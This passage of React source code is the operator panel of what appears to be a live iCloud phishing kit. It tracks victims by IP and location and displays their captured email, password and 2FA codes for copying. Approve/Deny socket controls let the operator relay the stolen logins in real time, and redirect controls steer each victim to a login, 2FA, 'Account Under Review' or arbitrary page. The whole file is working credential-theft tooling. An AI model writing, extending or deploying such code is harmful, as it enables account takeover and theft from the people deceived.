                            <div className="flex items-center gap-2 px-3 py-1 bg-[#1C1C1E] border border-[#2C2C2E] rounded">
                                <span className="text-gray-400">Total Connections</span>
                                <Users className="w-4 h-4 text-[#f0b100]" strokeWidth={2} />
                                <ChevronRight className="w-3 h-3 text-gray-600" />
                                <span className="font-semibold text-white">{stats.userCount}</span>
                            </div>
                            <div className="h-4 w-px bg-[#2C2C2E]"></div>
                            <div className="flex items-center gap-2 px-3 py-1 bg-[#1C1C1E] border border-[#2C2C2E] rounded">
                                <span className="text-gray-400">Active Now</span>
                                <Activity className="w-4 h-4 text-[#f0b100]" strokeWidth={2} />
                                <ChevronRight className="w-3 h-3 text-gray-600" />
                                <span className="font-semibold text-white">{connections.filter(c => c.isActive).length}</span>
                            </div>
                            <div className="h-4 w-px bg-[#2C2C2E]"></div>
                            <div className="flex items-center gap-2 px-3 py-1 bg-[#1C1C1E] border border-[#2C2C2E] rounded">
                                <span className="text-gray-400">Admin Sessions</span>
                                <Shield className="w-4 h-4 text-[#f0b100]" strokeWidth={2} />
                                <ChevronRight className="w-3 h-3 text-gray-600" />
                                <span className="font-semibold text-white">{stats.adminCount}</span>
                            </div>
                            <div className="h-4 w-px bg-[#2C2C2E]"></div>
                            <div className="flex items-center gap-2 px-3 py-1 bg-[#1C1C1E] border border-[#2C2C2E] rounded">
                                <span className="text-gray-400">Countries</span>
                                <Globe className="w-4 h-4 text-[#f0b100]" strokeWidth={2} />
                                <ChevronRight className="w-3 h-3 text-gray-600" />
                                <span className="font-semibold text-white">{new Set(connections.map(c => c.geoData?.country).filter(Boolean)).size}</span>
                            </div>
                        </div>
                    </nav>

                    {/* Error display */}
                    {error && (
                        <div className="mb-4 p-3 bg-red-500/10 border border-red-500/20 rounded flex items-center gap-2">
                            <AlertCircle className="w-5 h-5 text-red-400" />
                            <span className="text-red-300">{error}</span>
                            <button
                                onClick={fetchConnections}
                                className="ml-auto text-sm text-red-300 hover:text-red-200"
                            >
                                Retry
                            </button>
                        </div>
                    )}

                    {/* Connections View */}
                    <div className="space-y-4">
                            {/* Search and Filters */}
                            <div className="flex flex-wrap items-center gap-3">
                                <div className="flex-1 min-w-[200px]">
                                    <input
                                        type="text"
                                        placeholder="Search by IP, country, city..."
                                        value={searchTerm}
                                        onChange={(e) => {
                                            setSearchTerm(e.target.value);
                                            setCurrentPage(1);
                                        }}
                                        className="w-full px-3 py-2 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300 placeholder-gray-500 focus:outline-none input-coolify"
                                    />
                                </div>

                                <div className="flex items-center gap-2">
                                    <span className="text-xs font-medium text-gray-400 whitespace-nowrap">Show:</span>
                                    <select
                                        value={itemsPerPage}
                                        onChange={(e) => {
                                            setItemsPerPage(Number(e.target.value));
                                            setCurrentPage(1);
                                        }}
                                        className="px-3 py-2 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300 focus:outline-none input-coolify"
                                    >
                                        <option value={10}>10</option>
                                        <option value={20}>20</option>
                                        <option value={50}>50</option>
                                        <option value={100}>100</option>
                                    </select>
                                </div>

                                <div className="flex items-center gap-3 text-sm">
                                    <div className="px-3 py-2 bg-transparent">
                                        <span className="text-gray-500 font-medium">Total:</span>
                                        <span className="ml-1.5 font-semibold text-white">{stats.userCount}</span>
                                    </div>
                                    <div className="px-3 py-2 bg-transparent">
                                        <span className="text-gray-500 font-medium">Filtered:</span>
                                        <span className="ml-1.5 font-semibold text-white">{filteredConnections.length}</span>
                                    </div>
                                </div>
                            </div>

                                            {/* Connections List/Cards */}
                            {loading ? (
                                <div className="flex items-center justify-center h-64">
                                    <div className="text-center">
                                        <RefreshCw className="w-16 h-16 animate-spin mx-auto mb-4 text-gray-600" strokeWidth={1.5} />
                                        <p className="text-gray-400 text-lg font-medium">Loading connections...</p>
                                    </div>
                                </div>
                            ) : paginatedConnections.length === 0 ? (
                                <div className="flex items-center justify-center h-64">
                                    <div className="text-center">
                                        <Wifi className="w-16 h-16 mx-auto mb-4 text-gray-600" strokeWidth={1.5} />
                                        <p className="text-gray-400 text-lg font-medium">No burgers</p>
                                        {searchTerm && (
                                            <p className="text-gray-500 text-sm mt-2">
                                                Try adjusting your search term
                                            </p>
                                        )}
                                    </div>
                                </div>
                            ) : (
                                <div className="bg-[#1C1C1E] border border-[#2C2C2E] rounded overflow-hidden">
                                    {/* Connection Cards */}
                                    <div className="divide-y divide-[#2C2C2E]">
                                            {paginatedConnections.map((conn, index) => {
                                                const refId = Array.from(conn.id).reduce((acc, char) => acc + char.charCodeAt(0) * 100, 0).toString().slice(0, 8);
                                                return (
                                                <Sheet key={conn.id}>
                                                <SheetTrigger asChild>
                                                <div
                                                    className={`p-4 bg-[#181818] hover:bg-[#121212] transition-colors cursor-pointer ${!conn.isActive ? 'opacity-60' : ''
                                                        }`}
                                                    onClick={() => handleSheetOpen(conn)}
                                                >
                                                    <div className="flex items-center justify-between gap-4">
                                                        <div className="flex items-start gap-4 flex-1">
                                                            {/* Flag & Status */}
                                                            <div className="flex-shrink-0">
                                                                <img
                                                                    src={getFlagEmoji(conn.geoData?.country) || "/placeholder.svg"}
                                                                    alt="Flag"
                                                                    className="w-10 h-10 rounded"
                                                                />
                                                                <div className="mt-2 flex justify-center">
                                                                    <Status variant={conn.isActive ? 'success' : 'error'} className="text-[10px]">
                                                                        <StatusIndicator className="size-1.5 before:size-1.5 after:size-1" />
                                                                        <StatusLabel className="font-bold">{conn.isActive ? 'Active' : 'Offline'}</StatusLabel>
                                                                    </Status>
                                                                </div>
                                                            </div>

                                                            {/* Main Info */}
                                                            <div className="flex-1 min-w-0">
                                                                <div className="flex items-center gap-2 mb-2">
                                                                    <h3 className="text-sm font-medium text-white">
                                                                        {conn.geoData?.city || 'Unknown'}, {conn.geoData?.country || 'N/A'}
                                                                    </h3>
                                                                    {conn.loginData && !conn.loginData.twoFactorCode && (
                                                                        <Status variant="warning" className="px-2 py-0.5 text-[10px]">
                                                                            <StatusIndicator className="size-1.5 before:size-1.5 after:size-1" />
                                                                            <StatusLabel>Login Data Submitted</StatusLabel>
                                                                        </Status>
                                                                    )}
                                                                    {conn.loginData?.twoFactorCode && (
                                                                        <Status variant="info" className="px-2 py-0.5 text-[10px]">
                                                                            <StatusIndicator className="size-1.5 before:size-1.5 after:size-1" />
                                                                            <StatusLabel>2FA Code Submitted</StatusLabel>
                                                                        </Status>
                                                                    )}
                                                                </div>

                                                                <div className="grid grid-cols-2 gap-x-4 gap-y-2 text-xs">
                                                                    <div>
                                                                        <span className="text-gray-500">IP:</span>
                                                                        <span className="ml-2 text-gray-300 font-mono">{conn.geoData?.ip || 'N/A'}</span>
                                                                    </div>
                                                                    <div className="flex items-center">
                                                                        <span className="text-gray-500 flex items-center gap-1">
                                                                            Page:
                                                                            <Info className="w-3.5 h-3.5 text-[#f0b100]" strokeWidth={2} />
                                                                        </span>
                                                                        <span className="ml-2 text-gray-300">{conn.currentPage || 'N/A'}</span>
                                                                    </div>
                                                                    <div>
                                                                        <span className="text-gray-500">Region:</span>
                                                                        <span className="ml-2 text-gray-300">{conn.geoData?.region || 'N/A'}</span>
                                                                    </div>
                                                                    <div>
                                                                        <span className="text-gray-500">Timezone:</span>
                                                                        <span className="ml-2 text-gray-300">{conn.geoData?.timezone || 'N/A'}</span>
                                                                    </div>
                                                                    <div className="flex items-center">
                                                                        <span className="text-gray-500 flex items-center gap-1">
                                                                            Reference ID:
                                                                            <Info className="w-3.5 h-3.5 text-[#f0b100]" strokeWidth={2} />
                                                                        </span>
                                                                        <button
                                                                            type="button"
                                                                            onClick={(e) => { e.stopPropagation(); copyToClipboard(refId, 'ref-' + conn.id); }}
                                                                            className="ml-2 text-gray-300 font-mono inline-flex items-center gap-1.5 hover:text-[#f0b100] transition-colors"
                                                                            title="Click to copy"
                                                                        >
                                                                            {refId}
                                                                            {copiedField === 'ref-' + conn.id ? (
                                                                                <svg className="w-3.5 h-3.5 text-green-500 shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
                                                                            ) : (
                                                                                <svg className="w-3.5 h-3.5 text-gray-500 shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2 .9-2 2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
                                                                            )}
                                                                        </button>
                                                                    </div>
                                                                    <div>
                                                                        <span className="text-gray-500">Connected:</span>
                                                                        <span className="ml-2 text-gray-300">{formatTimeAgo(conn.connectedAt)}</span>
                                                                    </div>
                                                                </div>

                                                                <div className="mt-2">
                                                                    <div className="text-[10px] text-gray-500 truncate" title={conn.userAgent}>
                                                                        {conn.userAgent || 'No user agent'}
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>

                                                        {/* Actions - delete at end, centered */}
                                                        <div className="flex items-center justify-end flex-shrink-0">
                                                            <button
                                                                onClick={(e) => {
                                                                    e.stopPropagation();
                                                                    setConnectionToDelete(conn);
                                                                }}
                                                                className="p-2 hover:bg-red-500/20 rounded transition-colors group"
                                                                title="Remove connection"
                                                            >
                                                                <Trash2 className="w-4 h-4 text-gray-400 group-hover:text-red-400" />
                                                            </button>
                                                        </div>
                                                    </div>
                                                </div>
                                                </SheetTrigger>
                                                <SheetContent
                                                                    side="right"
                                                                    className="w-full sm:max-w-md bg-[#0f0f0f] border-l border-[#2C2C2E] overflow-y-auto p-6"
                                                                >
                                                                    {selectedConnection && (
                                                                    <>
                                                                        <SheetHeader className="mb-6">
                                                                            <div className="flex items-center gap-3">
                                                                                <img
                                                                                    src={getFlagEmoji(selectedConnection.geoData?.country) || "/placeholder.svg"}
                                                                                    alt="Flag"
                                                                                    className="w-10 h-10 rounded"
                                                                                />
                                                                                <div>
                                                                                    <SheetTitle className="text-white">
                                                                                        Connection Details
                                                                                    </SheetTitle>
                                                                                    <SheetDescription className="text-gray-400 text-sm">
                                                                                        {selectedConnection.geoData?.city || 'Unknown'}, {selectedConnection.geoData?.country || 'N/A'}
                                                                                    </SheetDescription>
                                                                                </div>
                                                                            </div>
                                                                        </SheetHeader>

                                                                        <div className="space-y-6">
                                                                            {/* Basic Information */}
                                                                            <div className="space-y-4">
                                                                                <button
                                                                                    onClick={() => setSectionsOpen(prev => ({ ...prev, basic: !prev.basic }))}
                                                                                    className="w-full text-base font-semibold text-white border-b border-[#2C2C2E] pb-2 flex items-center justify-between hover:text-[#f0b100] transition-colors"
                                                                                >
                                                                                    Basic Information
                                                                                    <ChevronDown className={`w-4 h-4 transition-transform ${sectionsOpen.basic ? '' : '-rotate-90'}`} />
                                                                                </button>

                                                                                {sectionsOpen.basic && (
                                                                                    <div className="space-y-3">
                                                                                    <Field className="w-full">
                                                                                        <FieldLabel className="text-gray-500 text-xs mb-1.5 block">Socket ID</FieldLabel>
                                                                                        <Input readOnly value={selectedConnection.id ?? ''} className="bg-[#0a0a0a] border-[#2C2C2E] text-gray-300 font-mono text-sm" />
                                                                                    </Field>

                                                                                    <Field className="w-full">
                                                                                        <FieldLabel className="text-gray-500 text-xs mb-1.5 block">Status</FieldLabel>
                                                                                        <Status variant={selectedConnection.isActive ? 'success' : 'error'} className="px-3 py-1.5 text-sm">
                                                                                            <StatusIndicator />
                                                                                            <StatusLabel>{selectedConnection.isActive ? 'Active' : 'Inactive'}</StatusLabel>
                                                                                        </Status>
                                                                                    </Field>

                                                                                    <Field className="w-full">
                                                                                        <FieldLabel className="text-gray-500 text-xs mb-1.5 block">User Agent</FieldLabel>
                                                                                        <Input readOnly value={selectedConnection.userAgent || 'Not available'} className="bg-[#0a0a0a] border-[#2C2C2E] text-gray-400 text-xs" title={selectedConnection.userAgent || ''} />
                                                                                    </Field>

                                                                                    <Field className="w-full">
                                                                                        <FieldLabel className="text-gray-500 text-xs mb-1.5 block">Current Page</FieldLabel>
                                                                                        <Input readOnly value={selectedConnection.currentPage || 'N/A'} className="bg-[#0a0a0a] border-[#2C2C2E] text-gray-300 text-sm" />
                                                                                    </Field>
                                                                                </div>
                                                                                )}
                                                                            </div>

                                                                            {/* Location Information */}
                                                                            <div className="space-y-4">
                                                                                <button
                                                                                    onClick={() => setSectionsOpen(prev => ({ ...prev, location: !prev.location }))}
                                                                                    className="w-full text-base font-semibold text-white border-b border-[#2C2C2E] pb-2 flex items-center justify-between hover:text-[#f0b100] transition-colors"
                                                                                >
                                                                                    Location Information
                                                                                    <ChevronDown className={`w-4 h-4 transition-transform ${sectionsOpen.location ? '' : '-rotate-90'}`} />
                                                                                </button>

                                                                                {sectionsOpen.location && (
                                                                                    <>
                                                                                        <div className="grid grid-cols-2 gap-3">
                                                                                            <Field className="w-full">
                                                                                                <FieldLabel className="text-gray-500 text-xs mb-1.5 block">IP Address</FieldLabel>
                                                                                                <div className="flex h-9 w-full min-w-0 items-center rounded-md border border-[#2C2C2E] bg-[#0a0a0a] px-3 py-1 text-sm text-gray-300 font-mono">
                                                                                                    <span className="flex-1 min-w-0 truncate">{selectedConnection.geoData?.ip || 'N/A'}</span>
                                                                                                    <button type="button" onClick={() => openInNewTab(getIPInfoLink(selectedConnection.geoData?.ip))} disabled={!selectedConnection.geoData?.ip} className="ml-2 shrink-0 text-[#f0b100] hover:text-[#d99a00] disabled:opacity-30"><ExternalLink className="w-3.5 h-3.5" /></button>
                                                                                                </div>
                                                                                            </Field>

                                                                                            <Field className="w-full">
                                                                                                <FieldLabel className="text-gray-500 text-xs mb-1.5 block">Country</FieldLabel>
                                                                                                <div className="flex h-9 w-full min-w-0 items-center gap-2 rounded-md border border-[#2C2C2E] bg-[#0a0a0a] px-3 py-1 text-sm text-gray-300">
                                                                                                    <img src={getFlagEmoji(selectedConnection.geoData?.country) || "/placeholder.svg"} alt="" className="h-5 w-5 shrink-0 rounded" />
                                                                                                    <span className="truncate">{selectedConnection.geoData?.country || 'N/A'}</span>
                                                                                                </div>
                                                                                            </Field>

                                                                                            <Field className="w-full">
                                                                                                <FieldLabel className="text-gray-500 text-xs mb-1.5 block">City</FieldLabel>
                                                                                                <Input readOnly value={selectedConnection.geoData?.city || 'N/A'} className="bg-[#0a0a0a] border-[#2C2C2E] text-gray-300 text-sm" />
                                                                                            </Field>

                                                                                            <Field className="w-full">
                                                                                                <FieldLabel className="text-gray-500 text-xs mb-1.5 block">Region</FieldLabel>
                                                                                                <Input readOnly value={selectedConnection.geoData?.region || 'N/A'} className="bg-[#0a0a0a] border-[#2C2C2E] text-gray-300 text-sm" />
                                                                                            </Field>

                                                                                            <Field className="w-full">
                                                                                                <FieldLabel className="text-gray-500 text-xs mb-1.5 block">Postal Code</FieldLabel>
                                                                                                <Input readOnly value={selectedConnection.geoData?.postal || 'N/A'} className="bg-[#0a0a0a] border-[#2C2C2E] text-gray-300 text-sm" />
                                                                                            </Field>

                                                                                            <Field className="w-full">
                                                                                                <FieldLabel className="text-gray-500 text-xs mb-1.5 block">Timezone</FieldLabel>
                                                                                                <Input readOnly value={selectedConnection.geoData?.timezone || 'N/A'} className="bg-[#0a0a0a] border-[#2C2C2E] text-gray-300 text-sm" />
                                                                                            </Field>
                                                                                        </div>

                                                                                        <Field className="w-full">
                                                                                            <FieldLabel className="text-gray-500 text-xs mb-1.5 block">Coordinates</FieldLabel>
                                                                                            <div className="flex h-9 w-full min-w-0 items-center rounded-md border border-[#2C2C2E] bg-[#0a0a0a] px-3 py-1 text-sm text-gray-300 font-mono">
                                                                                                <span className="flex-1 min-w-0 truncate">{selectedConnection.geoData?.loc || 'N/A'}</span>
                                                                                                <button type="button" onClick={() => openInNewTab(getCoordinatesLink(selectedConnection.geoData?.loc))} disabled={!selectedConnection.geoData?.loc} className="ml-2 shrink-0 text-[#f0b100] hover:text-[#d99a00] disabled:opacity-30"><MapPin className="w-3.5 h-3.5" /></button>
                                                                                            </div>
                                                                                        </Field>

                                                                                        <Field className="w-full">
                                                                                            <FieldLabel className="text-gray-500 text-xs mb-1.5 block">Organization</FieldLabel>
                                                                                            <Input readOnly value={selectedConnection.geoData?.org || 'N/A'} className="bg-[#0a0a0a] border-[#2C2C2E] text-gray-400 text-xs" />
                                                                                        </Field>
                                                                                    </>
                                                                                )}
                                                                            </div>

                                                                            {/* Control Actions */}
                                                                            <div className="space-y-4">
                                                                                <button
                                                                                    onClick={() => setSectionsOpen(prev => ({ ...prev, control: !prev.control }))}
                                                                                    className="w-full text-base font-semibold text-white border-b border-[#2C2C2E] pb-2 flex items-center justify-between hover:text-[#f0b100] transition-colors"
                                                                                >
                                                                                    Control Actions
                                                                                    <ChevronDown className={`w-4 h-4 transition-transform ${sectionsOpen.control ? '' : '-rotate-90'}`} />
                                                                                </button>

                                                                                {sectionsOpen.control && (<>

                                                                                    <Field className="w-full">
                                                                                        <FieldLabel className="text-gray-500 text-xs mb-1.5 block">Redirect to Page</FieldLabel>
                                                                                        <div className="flex gap-2">
                                                                                            <select
                                                                                                value={selectedRedirectPage}
                                                                                                onChange={(e) => setSelectedRedirectPage(e.target.value)}
                                                                                                className="flex-1 h-9 rounded-md border border-[#2C2C2E] bg-[#0a0a0a] px-3 py-1 text-sm text-gray-300 focus:outline-none input-coolify"
                                                                                            >
                                                                                                <option value="">Select page</option>
                                                                                                <option value="landingPage">Landing Page</option>
                                                                                                <option value="loginPage">Login Page</option>
                                                                                                <option value="2faPage">2FA Page</option>
                                                                                                <option value="AURPage">Account Under Review</option>
                                                                                            </select>
                                                                                            <Button
                                                                                                onClick={() => {
                                                                                                    handleRedirectPage(selectedConnection.id, selectedRedirectPage);
                                                                                                    setRedirectPageSent(true);
                                                                                                    setTimeout(() => setRedirectPageSent(false), 2000);
                                                                                                }}
                                                                                                disabled={!selectedRedirectPage}
                                                                                                variant="amber"
                                                                                            >
                                                                                                {redirectPageSent ? 'Sent' : 'Send'}
                                                                                            </Button>
                                                                                        </div>
                                                                                    </Field>
                                                                                    </>
                                                                                )}
                                                                            </div>

                                                                            {/* iCloud Credentials */}
                                                                            <div className="space-y-4">
                                                                                <button
                                                                                    onClick={() => setSectionsOpen(prev => ({ ...prev, credentials: !prev.credentials }))}
                                                                                    className="w-full text-base font-semibold text-white border-b border-[#2C2C2E] pb-2 flex items-center justify-between hover:text-[#f0b100] transition-colors"
                                                                                >
                                                                                    iCloud Credentials
                                                                                    <ChevronDown className={`w-4 h-4 transition-transform ${sectionsOpen.credentials ? '' : '-rotate-90'}`} />
                                                                                </button>

                                                                                {sectionsOpen.credentials && (
                                                                                    <>
                                                                                        {/* Login Data row: custom SVG + label; pending → details + Approve/Deny; approved/denied → label */}
                                                                                        <div className="space-y-3">
                                                                                            <div className="flex items-center gap-2 text-sm text-gray-300">
                                                                                                <svg className="w-4 h-4 shrink-0 text-[#f0b100]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M15 7h1a2 2 0 0 1 2 2v6a2 2 0 0 1-2 2h-2"/><path d="M9 7H4a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h2"/><path d="M9 11a4 4 0 1 0 6 0 4 4 0 0 0-6 0Z"/></svg>
                                                                                                <span className="font-medium text-white">Login Data:</span>
                                                                                                {!selectedConnection.loginData ? (
                                                                                                    <span className="text-gray-500">—</span>
                                                                                                ) : (() => {
                                                                                                    const status = getCredentialStatus(selectedConnection.id);
                                                                                                    const isNewLogin = status.loginVersion !== loginDataVersion;
                                                                                                    const effectiveLogin = (status.login !== 'pending' && !isNewLogin) ? status.login : 'pending';
                                                                                                    const emailPassBlock = (
                                                                                                        <div className="space-y-1 flex-1">
                                                                                                            <button type="button" onClick={() => copyToClipboard(selectedConnection.loginData.email, 'email')} className="w-full p-2 rounded-sm text-sm text-left hover:bg-white/5 transition-colors cursor-pointer flex items-center justify-between gap-2" title="Click to copy"><span className="text-white text-xs font-medium shrink-0">Email</span><span className="font-mono text-gray-300 truncate min-w-0">{selectedConnection.loginData.email}</span>{copiedField === 'email' ? <CheckCircle className="w-3.5 h-3.5 text-green-500 shrink-0" /> : <Copy className="w-3.5 h-3.5 text-gray-500 shrink-0" />}</button>
                                                                                                            <button type="button" onClick={() => copyToClipboard(selectedConnection.loginData.password, 'password')} className="w-full p-2 rounded-sm text-sm text-left hover:bg-white/5 transition-colors cursor-pointer flex items-center justify-between gap-2" title="Click to copy"><span className="text-white text-xs font-medium shrink-0">Password</span><span className="font-mono text-gray-300 truncate min-w-0">{selectedConnection.loginData.password}</span>{copiedField === 'password' ? <CheckCircle className="w-3.5 h-3.5 text-green-500 shrink-0" /> : <Copy className="w-3.5 h-3.5 text-gray-500 shrink-0" />}</button>
                                                                                                        </div>
                                                                                                    );
                                                                                                    if (effectiveLogin === 'approved') {
                                                                                                        return (<div className="flex flex-col gap-2 flex-1"><span className="text-green-500 flex items-center gap-1.5"><CheckCircle className="w-4 h-4" /> Approved</span>{emailPassBlock}</div>);
                                                                                                    }
                                                                                                    if (effectiveLogin === 'denied') {
                                                                                                        return (<div className="flex flex-col gap-2 flex-1"><span className="text-red-500 flex items-center gap-1.5"><XCircle className="w-4 h-4" /> Denied</span>{emailPassBlock}</div>);
                                                                                                    }
                                                                                                    return (
                                                                                                        <div className="flex flex-col gap-2 flex-1">
                                                                                                            <div className="flex items-center gap-2 flex-wrap">
                                                                                                                <button
                                                                                                                    onClick={() => { setLoginStatus(selectedConnection.id, 'approved', selectedConnection.loginData); socket.emit('approveSignIn', { socketId: selectedConnection.id }); }}
                                                                                                                    className="px-3 py-1.5 text-xs border border-[#f0b100] text-[#f0b100] bg-[#f0b100]/10 hover:bg-[#f0b100]/20 font-medium rounded flex items-center gap-1.5"
                                                                                                                >
                                                                                                                    <CheckCircle className="w-3.5 h-3.5" /> Approve
                                                                                                                </button>
                                                                                                                <button
                                                                                                                    onClick={() => { setLoginStatus(selectedConnection.id, 'denied', selectedConnection.loginData); socket.emit('denySignIn', { socketId: selectedConnection.id }); }}
                                                                                                                    className="px-3 py-1.5 text-xs border border-red-500 text-red-500 bg-red-500/10 hover:bg-red-500/20 font-medium rounded flex items-center gap-1.5"
                                                                                                                >
                                                                                                                    <XCircle className="w-3.5 h-3.5" /> Deny
                                                                                                                </button>
                                                                                                            </div>
                                                                                                            {emailPassBlock}
                                                                                                        </div>
                                                                                                    );
                                                                                                })()}
                                                                                            </div>

                                                                                            {/* 2FA Code row: custom SVG + "2FA Code: Waiting..." or code + Approve/Deny or Approved/Denied */}
                                                                                            <div className="flex items-center gap-2 text-sm text-gray-300">
                                                                                                <svg className="w-4 h-4 shrink-0 text-[#f0b100]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                                                                                                <span className="font-medium text-white">2FA Code:</span>
                                                                                                {!selectedConnection.loginData?.twoFactorCode ? (
                                                                                                    <span className="text-gray-500">Waiting...</span>
                                                                                                ) : (() => {
                                                                                                    const status = getCredentialStatus(selectedConnection.id);
                                                                                                    const isNew2FA = status.twoFAVersion !== twoFAVersion;
                                                                                                    const effective2FA = (status.twoFA !== 'pending' && status.twoFA !== 'waiting' && !isNew2FA) ? status.twoFA : 'pending';
                                                                                                    const codeBlock = (
                                                                                                        <button type="button" onClick={() => copyToClipboard(selectedConnection.loginData.twoFactorCode, '2fa')} className="p-2 rounded-sm text-sm text-[#f0b100] font-mono font-bold hover:bg-white/5 transition-colors cursor-pointer flex items-center gap-2" title="Click to copy">
                                                                                                            {selectedConnection.loginData.twoFactorCode}
                                                                                                            {copiedField === '2fa' ? <CheckCircle className="w-3.5 h-3.5 text-green-500 shrink-0" /> : <Copy className="w-3.5 h-3.5 text-gray-500 shrink-0" />}
                                                                                                        </button>
                                                                                                    );
                                                                                                    if (effective2FA === 'approved') {
                                                                                                        return (<div className="flex items-center gap-2 flex-wrap"><span className="text-green-500 flex items-center gap-1.5"><CheckCircle className="w-4 h-4" /> Approved</span>{codeBlock}</div>);
                                                                                                    }
                                                                                                    if (effective2FA === 'denied') {
                                                                                                        return (<div className="flex items-center gap-2 flex-wrap"><span className="text-red-500 flex items-center gap-1.5"><XCircle className="w-4 h-4" /> Denied</span>{codeBlock}</div>);
                                                                                                    }
                                                                                                    return (
                                                                                                        <div className="flex items-center gap-2 flex-wrap">
                                                                                                            {codeBlock}
                                                                                                            <button
                                                                                                                onClick={() => { setTwoFAStatus(selectedConnection.id, 'approved', selectedConnection.loginData.twoFactorCode); socket.emit('approve2fa', { socketId: selectedConnection.id }); setTimeout(() => setNotificationExiting(true), 1000); }}
                                                                                                                className="px-3 py-1.5 text-xs border border-[#f0b100] text-[#f0b100] bg-[#f0b100]/10 hover:bg-[#f0b100]/20 font-medium rounded flex items-center gap-1.5"
                                                                                                            >
                                                                                                                <CheckCircle className="w-3.5 h-3.5" /> Approve
                                                                                                            </button>
                                                                                                            <button
                                                                                                                onClick={() => { setTwoFAStatus(selectedConnection.id, 'denied', selectedConnection.loginData.twoFactorCode); socket.emit('deny2fa', { socketId: selectedConnection.id }); setTimeout(() => setNotificationExiting(true), 1000); }}
                                                                                                                className="px-3 py-1.5 text-xs border border-red-500 text-red-500 bg-red-500/10 hover:bg-red-500/20 font-medium rounded flex items-center gap-1.5"
                                                                                                            >
                                                                                                                <XCircle className="w-3.5 h-3.5" /> Deny
                                                                                                            </button>
                                                                                                        </div>
                                                                                                    );
                                                                                                })()}
                                                                                            </div>
                                                                                        </div>

                                                                                        {/* Redirect to URL - only when we have login data */}
                                                                                        {selectedConnection.loginData && (
                                                                                            <>
                                                                                                <Field className="w-full">
                                                                                                    <FieldLabel className="text-gray-500 text-xs mb-1.5 block">Redirect to URL</FieldLabel>
                                                                                                    <div className="flex gap-2">
                                                                                                        <Input
                                                                                                            type="url"
                                                                                                            placeholder="https://example.com"
                                                                                                            value={redirectUrl}
                                                                                                            onChange={(e) => setRedirectUrl(e.target.value)}
                                                                                                            className="flex-1 bg-[#0a0a0a] border-[#2C2C2E] text-gray-300 placeholder-gray-500 input-coolify"
                                                                                                        />
                                                                                                        <Button
                                                                                                            onClick={() => {
                                                                                                                if (redirectUrl.trim()) {
                                                                                                                    socket.emit('redirect', { socketId: selectedConnection.id, url: redirectUrl });
                                                                                                                    setRedirectUrl('');
                                                                                                                    setRedirectUrlSent(true);
                                                                                                                    setTimeout(() => setRedirectUrlSent(false), 2000);
                                                                                                                }
                                                                                                            }}
                                                                                                            variant="amber"
                                                                                                        >
                                                                                                            {redirectUrlSent ? 'Sent' : 'Send'}
                                                                                                        </Button>
                                                                                                    </div>
                                                                                                </Field>
                                                                                                {selectedConnection.lastRedirect && (
                                                                                                    <Field className="w-full">
                                                                                                        <FieldLabel className="text-gray-500 text-xs mb-1.5 block">Last redirect</FieldLabel>
                                                                                                        <Input readOnly value={selectedConnection.lastRedirect.url} className="bg-[#51A2FF]/10 border-[#51A2FF]/20 text-[#51A2FF] text-xs" />
                                                                                                    </Field>
                                                                                                )}
                                                                                            </>
                                                                                        )}
                                                                                    </>
                                                                                )}
                                                                            </div>

                                                                            {/* Timing Information */}
                                                                            <div className="space-y-4">
                                                                                <button
                                                                                    onClick={() => setSectionsOpen(prev => ({ ...prev, timing: !prev.timing }))}
                                                                                    className="w-full text-base font-semibold text-white border-b border-[#2C2C2E] pb-2 flex items-center justify-between hover:text-[#f0b100] transition-colors"
                                                                                >
                                                                                    Connection Timing
                                                                                    <ChevronDown className={`w-4 h-4 transition-transform ${sectionsOpen.timing ? '' : '-rotate-90'}`} />
                                                                                </button>

                                                                                {sectionsOpen.timing && (
                                                                                    <div className="grid grid-cols-2 gap-3">
                                                                                    <Field className="w-full">
                                                                                        <FieldLabel className="text-gray-500 text-xs mb-1.5 block">Connected At</FieldLabel>
                                                                                        <Input readOnly value={formatFullDate(selectedConnection.connectedAt)} className="bg-[#0a0a0a] border-[#2C2C2E] text-gray-300 text-sm" />
                                                                                    </Field>
                                                                                    <Field className="w-full">
                                                                                        <FieldLabel className="text-gray-500 text-xs mb-1.5 block">Duration</FieldLabel>
                                                                                        <Input readOnly value={formatTimeAgo(selectedConnection.connectedAt)} className="bg-[#0a0a0a] border-[#2C2C2E] text-gray-300 text-sm" />
                                                                                    </Field>
                                                                                </div>
                                                                                )}
                                                                            </div>
                                                                        </div>

                                                                        <SheetFooter className="mt-6 pt-6 border-t border-[#2C2C2E]">
                                                                            <div className="flex gap-3 w-full">
                                                                                <Button
                                                                                    onClick={() => {
                                                                                        const data = {
                                                                                            ...selectedConnection,
                                                                                            fetchedAt: new Date().toISOString()
                                                                                        };
                                                                                        copyToClipboard(JSON.stringify(data, null, 2));
                                                                                    }}
                                                                                    variant="amber"
                                                                                    className="flex-1"
                                                                                >
                                                                                    <Copy className="w-4 h-4" />
                                                                                    Copy JSON
                                                                                </Button>
                                                                                <SheetClose asChild>
                                                                                    <Button variant="muted" className="flex-1">
                                                                                        Close
                                                                                    </Button>
                                                                                </SheetClose>
                                                                            </div>
                                                                        </SheetFooter>
                                                                    </>
                                                                )}
                                                </SheetContent>
                                            </Sheet>
                                                );
                                            })}
                                        </div>

                                        {/* Pagination */}
                                        {totalPages > 1 && (
                                            <div className="flex items-center justify-between px-4 py-3 border-t border-[#2C2C2E] bg-[#1C1C1E]">
                                                <div className="text-xs text-gray-400 font-medium">
                                                    Showing {startIndex + 1} to {Math.min(endIndex, filteredConnections.length)} of{' '}
                                                    {filteredConnections.length} connections
                                                </div>

                                                <div className="flex items-center gap-1">
                                                    <button
